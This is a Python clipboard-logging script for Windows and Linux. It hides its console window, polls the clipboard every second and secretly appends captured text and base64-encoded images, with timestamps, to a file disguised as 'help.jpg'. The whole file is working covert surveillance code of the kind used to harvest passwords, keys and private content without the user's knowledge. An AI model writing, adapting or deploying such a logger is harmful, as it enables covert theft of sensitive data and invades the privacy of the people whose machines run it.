import sys,os,io,time, base64
from datetime import datetime

platform = sys.platform

if platform == 'win32':
	import win32clipboard, win32gui, win32console
	from PIL import ImageGrab
#else for linux
else:
	import gi
	gi.require_version('Gtk','3.0')
	from gi.repository import gtk,Gdk
	clipboard = gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)

cbData=''
flePath = 'help.jpg'
slpDur=1
imgQly=10

def writeData(data):
	with open(flePath,"a") as fle:
		fle.write(data)
	fle.close()

def hideWindow():
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)


def getWinClip():
	global cbData
	win32clipboard.OpenClipboard()
	try :
		text = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
		win32clipboard.CloseClipboard()
		if cbData != text :
			cbData=text
			writeData('::t::'+ str(datetime.now()) + '\n' + str(text.decode()) + '\n')
	except:
		win32clipboard.CloseClipboard()
		img = ImageGrab.grabclipboard()
		buf = io.BytesIO()
		img.save(buf,format='jpeg',optimize=True,quality=imgQly)
		text = str(base64.b64encode(buf.getvalue()).decode())

		if cbData != text :
			cbData=text
			writeData('::i:'+ str(datetime.now()) + '\n' + str(text) + '\n')

def getLinClip():
	global cbData
	if clipboard.wait_is_text_available():
		text = clipboard.wait_for_text()
		if cbData != text:
			cbData=text
			writeData('::t:'+ str(datetime.now()) + '\n' + str(text) + '\n')
	elif clipboard.wait_is_image_available():
		img=clipboard.wait_for_image()
		buf = img.save_to_buffer('jpeg',[],[])
		img64 = base64.b64encode(buf[1])
		if cbData != img64:
			cbData = img64
			writeData('::i:' + str(datetime.now()) + '\n' + str(img64) + '\n')

if __name__ == "__main__":
	if platform == 'win32':
		hideWindow()
	while True:
		if platform == 'win32':
			getWinClip()
		else:
			getLinClip()

		time.sleep(slpDur)


		